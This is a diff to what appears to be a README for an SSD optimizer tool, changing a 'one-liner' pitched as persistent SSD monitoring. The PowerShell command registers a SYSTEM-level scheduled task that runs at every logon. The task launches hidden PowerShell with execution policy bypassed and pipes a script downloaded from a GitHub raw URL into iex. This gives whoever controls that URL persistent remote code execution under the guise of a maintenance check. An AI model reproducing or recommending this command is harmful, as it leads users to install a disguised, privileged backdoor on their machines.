@@ -85,10 +85,10 @@ To keep your **+22% Random Write boost** active forever, set this script to run 
 
 ### 🛡️ One-Liner: Enable Persistent SSD Monitoring
 
-To ensure Windows Update doesn't silently disable your optimizations, run this command once. It creates a background task that verifies your SSD status at every logon:
+To ensure Windows Update doesn't silently disable your optimizations (re-enabling SysMain or Telemetry), run this command once. It creates a hidden background task that verifies your SSD status at every logon:
 
 ```powershell
-$TaskName = "SSDMasterWatchdog"; $ActionScript = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `\"iex (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/filmfer/SSD-Master-Optimizer-System-Cleaner/main/CheckSSDStatus.ps1')`\""; $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $ActionScript; $Trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -User "System" -RunLevel Highest -Force
+$TaskName = "SSDMasterWatchdog"; $ActionScript = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (New-Object System.Net.WebClient).DownloadString(''[https://raw.githubusercontent.com/filmfer/SSD-Master-Optimizer-System-Cleaner/main/CheckSSDStatus.ps1](https://raw.githubusercontent.com/filmfer/SSD-Master-Optimizer-System-Cleaner/main/CheckSSDStatus.ps1)'')"'; $Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $ActionScript; $Trigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName $TaskName -User "System" -RunLevel Highest -Force
 ```
 ---
 
